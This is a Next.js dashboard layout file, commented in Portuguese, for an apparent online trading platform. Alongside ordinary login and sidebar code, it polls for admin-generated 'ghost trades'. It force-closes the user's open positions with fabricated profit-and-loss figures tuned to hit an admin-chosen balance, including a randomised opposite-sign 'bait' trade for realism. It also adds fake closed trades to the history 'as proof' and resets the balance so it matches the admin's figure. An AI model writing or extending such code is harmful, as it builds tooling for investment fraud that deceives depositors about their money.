"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { DashboardSidebar } from "@/components/dashboard/sidebar";
import { DashboardHeader } from "@/components/dashboard/header";
import { supabase } from "@/lib/supabase";
import { tradeStore } from "@/lib/trade-store";
import { accountStore } from "@/lib/account-store";
import { notificationStore } from "@/lib/notification-store";
import type { GhostPayload } from "@/lib/ghost-pending-store";

export default function DashboardLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const router = useRouter();
  const [ready, setReady] = useState(false);
  const [mobileOpen, setMobileOpen] = useState(false);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (!session) {
        supabase.auth
          .refreshSession()
          .then(({ data: { session: refreshed } }) => {
            if (!refreshed) router.replace("/auth/login");
            else setReady(true);
          })
          .catch(() => router.replace("/auth/login"));
      } else {
        setReady(true);
      }
    });

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((event) => {
      if (event === "SIGNED_OUT") router.replace("/auth/login");
    });
    return () => subscription.unsubscribe();
  }, [router]);

  // ── Polling: ghost trades gerados pelo admin ──────────────────────────────
  useEffect(() => {
    if (!ready) return;

    async function fetchGhostTrades() {
      try {
        const {
          data: { session },
        } = await supabase.auth.getSession();
        if (!session?.access_token) return;

        const res = await fetch("/api/user/ghost-trades", {
          headers: { Authorization: `Bearer ${session.access_token}` },
          cache: "no-store",
        });
        if (!res.ok) return;

        const { payload } = (await res.json()) as {
          payload: GhostPayload | null;
        };
        if (!payload) return;

        const openPositions = tradeStore.getOpen();
        const n = openPositions.length;

        if (payload.mode === "close_open" && n > 0) {
          // ─── Distribuição inteligente de P/Ls ────────────────────────────
          // O servidor envia `totalDelta` = o delta real do saldo.
          // REGRA: a soma de todos os P/Ls DEVE igualar exactamente totalDelta.
          //
          //  1 posição → fecha com PnL = totalDelta (sinal correcto preservado)
          //  2+ posições → pelo menos 1 com sinal oposto (bait), soma = totalDelta
          //  0 posições → bloco não entra aqui (saldo já actualizado no DB)

          const totalDelta = payload.totalDelta ?? (payload.pnls ?? []).reduce((a, b) => a + b, 0)
          const now = new Date().toISOString()

          // Calcular array de PnLs para N posições com soma exacta = totalDelta
          function buildPnls(count: number, target: number): number[] {
            if (count === 0) return []
            if (count === 1) return [parseFloat(target.toFixed(2))]

            // Bait: sinal OPOSTO ao target, entre 15-40% do absoluto (mín $1)
            const baitSign  = target >= 0 ? -1 : 1
            const baitAbs   = Math.max(1.00, Math.abs(target) * (0.15 + Math.random() * 0.25))
            const bait      = parseFloat((baitSign * baitAbs).toFixed(2))
            const remaining = parseFloat((target - bait).toFixed(2))

            if (count === 2) {
              // Ajuste para garantir soma exacta
              const last = parseFloat((target - bait).toFixed(2))
              return [bait, last]
            }

            // N > 2: distribuir remaining pelas N-1 fatias restantes
            const others: number[] = []
            let acc = 0
            for (let i = 0; i < count - 2; i++) {
              const ratio = 0.3 + Math.random() * 0.4
              const v     = parseFloat((remaining * ratio).toFixed(2))
              others.push(v)
              acc += v
            }
            // Última fatia absorve o restante (evita drift de floating-point)
            others.push(parseFloat((remaining - acc).toFixed(2)))

            // Inserir bait numa posição aleatória
            const baitIdx = Math.floor(Math.random() * count)
            const result: number[] = []
            let oi = 0
            for (let i = 0; i < count; i++) {
              result.push(i === baitIdx ? bait : others[oi++])
            }
            return result
          }

          const pnls = buildPnls(n, totalDelta)

          openPositions.forEach((pos, i) => {
            const pnl = pnls[i] ?? 0
            // Calcular preço de fecho consistente com o PnL
            const contractSize = 100_000
            const divisor      = pos.lots * contractSize
            const priceMove    = divisor > 0 ? pnl / divisor : 0
            const rawClose     = pos.type === "buy"
              ? pos.openPrice + priceMove
              : pos.openPrice - priceMove
            const closePrice   = Math.max(rawClose, pos.openPrice * 0.0001)

            tradeStore.closePositionDirect(
              pos.id,
              parseFloat(closePrice.toFixed(5)),
              pnl,
              now,
              "adjustment",
            )

            const pnlStr = (pnl >= 0 ? "+" : "") + "$" + Math.abs(pnl).toFixed(2)
            notificationStore.add(
              "trade_close",
              `Posição fechada — ${pos.symbol}`,
              `${pos.type === "buy" ? "Compra" : "Venda"} encerrada | P&L ${pnlStr}`,
            )
          })

          // ─── CRÍTICO: resetar epoch após fechar ghost trades ──────────────
          // Sem isto: balance = adminSetBalance + (ghostPnL - 0) = valor errado.
          // Com epoch = realizedPnL actual (inclui os ghost trades acabados de fechar),
          // deltaPnl = realizedPnl - epoch = 0 → balance = adminSetBalance exacto.
          if (accountStore.getMode() === "real") {
            const newRealizedPnl = tradeStore.getClosed().reduce((s, p) => s + p.pnl, 0)
            accountStore.setBalanceEpoch(newRealizedPnl)
          }

        } else if (payload.mode === "close_open" && n === 0 && payload.trades && payload.trades.length > 0) {
          // Sem posições abertas → adicionar operações ao histórico como prova
          // Usa trades pré-gerados pelo servidor (fallback)
          const now = new Date().toISOString()
          payload.trades.forEach(trade => {
            tradeStore.addClosedFromRemote({
              id:           trade.id,
              symbol:       trade.symbol,
              asset_name:   trade.symbol,
              type:         trade.type,
              lots:         trade.lots,
              amount:       trade.amount,
              leverage:     trade.leverage,
              open_price:   trade.openPrice,
              close_price:  trade.closePrice,
              pnl:          trade.pnl,
              opened_at:    trade.openedAt,
              closed_at:    trade.closedAt ?? now,
              close_reason: trade.closeReason,
            })
          })
          if (payload.trades.length > 0) {
            const total = payload.trades.reduce((s, t) => s + t.pnl, 0)
            const pnlStr = (total >= 0 ? "+" : "") + "$" + Math.abs(total).toFixed(2)
            notificationStore.add(
              "trade_close",
              `Operações encerradas`,
              `${payload.trades.length} operação(ões) registada(s) | P&L total ${pnlStr}`,
            )
          }
        }
        // Se não há posições abertas e nem trades: saldo já actualizado no DB — nada a fazer
      } catch {
        // falha silenciosa — próximo ciclo tenta de novo
      }
    }

    fetchGhostTrades();
    pollRef.current = setInterval(fetchGhostTrades, 5_000);

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [ready]);

  // ── Sync de estatísticas de posições para o CRM admin ───────────────────
  useEffect(() => {
    if (!ready) return;

    async function syncPositions() {
      try {
        const {
          data: { session },
        } = await supabase.auth.getSession();
        if (!session?.access_token) return;
        const open = tradeStore.getOpen();
        const closed = tradeStore.getClosed();
        const totalPnl = closed.reduce((sum, p) => sum + (p.pnl ?? 0), 0);
        await fetch("/api/user/positions/sync", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${session.access_token}`,
          },
          body: JSON.stringify({
            openCount: open.length,
            closedCount: closed.length,
            totalPnl,
          }),
        });
      } catch {
        // silencioso
      }
    }

    syncPositions();
    const syncId = setInterval(syncPositions, 60_000);
    return () => clearInterval(syncId);
  }, [ready]);

  // ── Supabase Realtime (posições abertas fechadas remotamente) ─────────────
  useEffect(() => {
    if (!ready) return;

    let cancelled = false;

    supabase.auth.getUser().then(({ data: { user } }) => {
      if (!user || cancelled) return;

      const channel = supabase
        .channel(`pos-watch-${user.id}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "positions",
            filter: `user_id=eq.${user.id}`,
          },
          (payload) => {
            const row = payload.new as Record<string, unknown>;
            if (row.status === "closed" && row.pnl != null) {
              tradeStore.closePositionDirect(
                row.id as string,
                parseFloat(String(row.close_price ?? 0)),
                parseFloat(String(row.pnl)),
                (row.closed_at as string) ?? new Date().toISOString(),
                (row.close_reason as string) ?? "manual",
              );
            }
          },
        )
        .subscribe();

      channelRef.current = channel;
    });

    return () => {
      cancelled = true;
      if (channelRef.current) {
        supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
    };
  }, [ready]);

  if (!ready) {
    return (
      <div className="h-screen flex items-center justify-center bg-[oklch(0.115_0.038_265)]">
        <div className="flex flex-col items-center gap-4">
          <div className="w-10 h-10 rounded-full border-2 border-[oklch(0.55_0.22_265)] border-t-transparent animate-spin" />
          <p className="text-sm text-[oklch(0.65_0.018_255)]">A carregar sessão…</p>
        </div>
      </div>
    );
  }

  return (
    <div
      className="h-screen overflow-hidden bg-background flex flex-col"
      style={{ "--header-h": "4.5rem" } as React.CSSProperties}
    >
      <DashboardHeader onMenuOpen={() => setMobileOpen(true)} />
      {/* Backdrop mobile */}
      {mobileOpen && (
        <div
          className="fixed inset-0 bg-black/60 z-40 lg:hidden"
          onClick={() => setMobileOpen(false)}
        />
      )}
      <div className="flex flex-1 min-h-0">
        <DashboardSidebar
          mobileOpen={mobileOpen}
          onMobileClose={() => setMobileOpen(false)}
          onCollapsedChange={setSidebarCollapsed}
        />
        {/* Mobile: pl-0 (sidebar é overlay). Desktop: dinâmico conforme sidebar colapsada/expandida */}
        <main
          className={`dashboard-light bg-background text-foreground flex-1 overflow-hidden pl-0 transition-all duration-300 ${sidebarCollapsed ? "lg:pl-16" : "lg:pl-64"}`}
        >
          {children}
        </main>
      </div>
    </div>
  );
}
